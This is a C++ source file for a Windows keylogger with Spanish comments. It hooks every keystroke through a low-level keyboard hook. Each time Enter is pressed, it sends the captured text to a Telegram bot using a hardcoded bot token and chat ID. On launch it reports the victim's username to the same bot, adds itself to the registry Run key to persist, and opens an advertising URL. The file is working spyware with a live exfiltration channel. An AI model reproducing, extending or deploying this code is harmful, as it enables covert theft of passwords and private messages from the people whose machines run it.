#include <iostream>
#include <windows.h>
#include <fstream>
#include <string>
#include <wininet.h>
#include <shlobj.h>
#include <lmcons.h>
#pragma comment(lib, "wininet.lib")

std::string keys;
HHOOK hHook;
bool keepRunning = true;

bool IsCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
}

bool IsShiftPressed() {
    return (GetKeyState(VK_SHIFT) & 0x8000) != 0 || (GetKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetKeyState(VK_RSHIFT) & 0x8000) != 0;
}

char MapVirtualKeyToChar(DWORD vkCode) {
    char result;
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    
    if (IsCapsLockOn() ^ IsShiftPressed()) {
        keyboardState[VK_SHIFT] = 0x80;
    } else {
        keyboardState[VK_SHIFT] = 0x00;
    }
    
    WORD ascii;
    if (ToAscii(vkCode, MapVirtualKey(vkCode, MAPVK_VK_TO_VSC), keyboardState, &ascii, 0) == 1) {
        result = static_cast<char>(ascii);
    } else {
        result = 0;
    }
    
    return result;
}

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            if (pKeyBoard->vkCode == VK_BACK) {  // Handle backspace
                if (!keys.empty()) {
                    keys.pop_back();
                }
            } else {
                char key = MapVirtualKeyToChar(pKeyBoard->vkCode);
                if (key != 0) {
                    keys.push_back(key);
                }
            }

            // Combinación de teclas para finalizar el programa
            if (GetAsyncKeyState(VK_CONTROL) & 0x8000 && GetAsyncKeyState(VK_SHIFT) & 0x8000 && pKeyBoard->vkCode == 0x58) { // Ctrl + Shift + X
                keepRunning = false;
                PostQuitMessage(0);
            }

            if (pKeyBoard->vkCode == VK_RETURN) {
                // Enviar datos a Telegram
                HINTERNET hInternet = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
                if (hInternet) {
                    HINTERNET hConnect = InternetConnect(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
                    if (hConnect) {
                        std::string path = "/bot6456475347:AAFKBQzT3eduPZmQDc2Nu7SFf-XHvyi0OIA/sendMessage?chat_id=7088791052&text=" + keys;
                        HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
                        if (hRequest) {
                            HttpSendRequest(hRequest, NULL, 0, NULL, 0);
                            InternetCloseHandle(hRequest);
                        }
                        InternetCloseHandle(hConnect);
                    }
                    InternetCloseHandle(hInternet);
                }
                keys.clear();
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI KeyLogger(LPVOID lpParameter) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    MSG msg;
    while (keepRunning && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}

void AddToStartup() {
    HKEY hKey;
    LONG result = RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey);
    if (result == ERROR_SUCCESS) {
        char szPath[MAX_PATH];
        GetModuleFileName(NULL, szPath, MAX_PATH);
        result = RegSetValueEx(hKey, "MyKeyLogger", 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
        RegCloseKey(hKey);
    }
}

void SendStartupMessage() {
    // Obtener el nombre del usuario
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);

    // Crear el mensaje
    std::string message = "Keylogger abierto en el ordenador de ";
    message += username;

    // Enviar el mensaje a Telegram
    HINTERNET hInternet = InternetOpen("Keylogger", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hConnect = InternetConnect(hInternet, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (hConnect) {
            std::string path = "/bot6456475347:AAFKBQzT3eduPZmQDc2Nu7SFf-XHvyi0OIA/sendMessage?chat_id=7088791052&text=" + message;
            HINTERNET hRequest = HttpOpenRequest(hConnect, "GET", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);
            if (hRequest) {
                HttpSendRequest(hRequest, NULL, 0, NULL, 0);
                InternetCloseHandle(hRequest);
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
}

DWORD WINAPI ProcessTelegramCommandsThread(LPVOID lpParameter) {
    while (keepRunning) {
        /*ProcessTelegramCommands();*/
        Sleep(5000); // Chequear cada 5 segundos
    }
    return 0;
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Enviar mensaje de inicio al bot de Telegram
    SendStartupMessage();

    // Añadir al inicio
    AddToStartup();

    // Ejecutar un archivo al iniciar
    const wchar_t* url = L"https://chatbotapp.ai/landing?utm_source=GoogleAds&utm_medium=cpc&utm_campaign={campaign}&utm_id=21095627741&utm_term=&utm_content=&gad_source=1&gclid=CjwKCAjw65-zBhBkEiwAjrqRMKnV-GPm5ZPemBoEsaQs_-gGmPtM3KLemN9EU3sI9twOMqrulNC0VhoCvhsQAvD_BwE";
    ShellExecuteW(NULL, L"open", url, NULL, NULL, SW_SHOWNORMAL);

    // Iniciar el keylogger en un hilo separado
    HANDLE hThread = CreateThread(NULL, 0, KeyLogger, NULL, 0, NULL);
    if (hThread) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    // Procesar comandos de Telegram en un hilo separado
    HANDLE hCommandThread = CreateThread(NULL, 0, ProcessTelegramCommandsThread, NULL, 0, NULL);
    if (hCommandThread) {
        // Hilo creado correctamente
    } else {
        // Manejar error
    }

    return 0;
}
